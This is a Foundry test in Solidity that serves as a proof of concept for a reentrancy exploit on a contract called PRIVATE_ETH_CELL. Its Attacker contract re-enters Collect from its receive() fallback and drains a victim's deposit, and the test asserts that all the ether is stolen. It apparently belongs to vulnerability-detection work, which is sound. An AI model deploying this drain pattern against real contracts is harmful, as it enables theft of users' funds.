// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";

contract MockLogFile {
    function AddMessage(address, uint, string memory) public {
        // No action needed for test
    }
}

contract Attacker {
    PRIVATE_ETH_CELL public target;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(PRIVATE_ETH_CELL _target) {
        target = _target;
    }

    function deposit() external payable {
        target.Deposit{value: msg.value}();
    }

    function startAttack() external {
        target.Collect(ATTACK_AMOUNT);
    }

    // Handle incoming ether transfers
    receive() external payable {
        // Continue attacking while contract has sufficient funds
        if (address(target).balance >= ATTACK_AMOUNT) {
            target.Collect(ATTACK_AMOUNT);
        }
    }
}

contract PRIVATE_ETH_CELLTest is Test {
    PRIVATE_ETH_CELL public target;
    MockLogFile public mockLog;
    Attacker public attackerContract;
    address public constant VICTIM = address(0x3);
    uint256 public constant VICTIM_DEPOSIT = 10 ether;
    uint256 public constant ATTACKER_DEPOSIT = 1 ether;
    uint256 public constant TOTAL_DEPOSIT = VICTIM_DEPOSIT + ATTACKER_DEPOSIT;

    function setUp() public {
        // Deploy contracts
        target = new PRIVATE_ETH_CELL();
        mockLog = new MockLogFile();
        
        // Setup target contract
        vm.prank(address(this));
        target.SetLogFile(address(mockLog));
        
        vm.prank(address(this));
        target.SetMinSum(0.1 ether);
        
        // Deploy attacker contract
        attackerContract = new Attacker(target);
        
        // Fund and deposit from attacker contract
        vm.deal(address(attackerContract), ATTACKER_DEPOSIT);
        vm.prank(address(attackerContract));
        attackerContract.deposit{value: ATTACKER_DEPOSIT}();
        
        // Fund victim and deposit
        vm.deal(VICTIM, VICTIM_DEPOSIT);
        vm.prank(VICTIM);
        target.Deposit{value: VICTIM_DEPOSIT}();
    }

    function testReentrancy() public {
        // Verify initial balances
        assertEq(address(target).balance, TOTAL_DEPOSIT, "Initial contract balance should be 11 ether");
        assertEq(address(attackerContract).balance, 0, "Initial attacker balance should be 0");

        // Pre-attack state
        console2.log("--- BEFORE-TRIGGER ---");
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = address(attackerContract).balance;
        uint256 attackerInternalBalanceBefore = target.balances(address(attackerContract));
        console2.log("Target contract balance: %s", targetBalanceBefore);
        console2.log("Attacker contract balance: %s", attackerBalanceBefore);
        console2.log("Attacker internal balance: %s", attackerInternalBalanceBefore);

        console2.log("--- TRIGGER ATTACK ---");
        // Trigger attack
        vm.prank(address(attackerContract));
        attackerContract.startAttack();

        // Post-attack state
        console2.log("--- AFTER-TRIGGER ---");
        uint256 targetBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = address(attackerContract).balance;
        uint256 attackerInternalBalanceAfter = target.balances(address(attackerContract));
        console2.log("Target contract balance: %s", targetBalanceAfter);
        console2.log("Attacker contract balance: %s", attackerBalanceAfter);
        console2.log("Attacker internal balance: %s", attackerInternalBalanceAfter);

        // Validate changes
        console2.log("--- VALIDATION ---");
        uint256 targetDiff = targetBalanceBefore - targetBalanceAfter;
        uint256 attackerDiff = attackerBalanceAfter - attackerBalanceBefore;
        console2.log("Delta in target balance: %s", targetDiff);
        console2.log("Delta in attacker balance: %s", attackerDiff);
        console2.log("Delta in attacker internal balance: %s", attackerInternalBalanceAfter - attackerInternalBalanceBefore);

        // Vulnerability detection
        bool reentrancyExploited = targetBalanceBefore > targetBalanceAfter &&
                                   attackerBalanceAfter > attackerBalanceBefore &&
                                   attackerBalanceAfter >= TOTAL_DEPOSIT;
        
        if (reentrancyExploited) {
            console2.log("VULNERABILITY STATE: Changes in balances indicate successful reentrancy attack");
            console2.log("Vulnerability Exists: Contract's ETH balance drained and attacker balance increased without proper internal balance update");
        } else {
            console2.log("VULNERABILITY STATE: No indication of successful reentrancy attack");
            console2.log("Vulnerability not Exist: Balance changes do not show reentrancy exploitation");
        }

        // Original validation (retained)
        assertEq(
            address(target).balance, 
            0, 
            "Contract should be completely drained"
        );
        assertEq(
            address(attackerContract).balance, 
            TOTAL_DEPOSIT, 
            "Attacker should have stolen all deposited ether"
        );
    }
}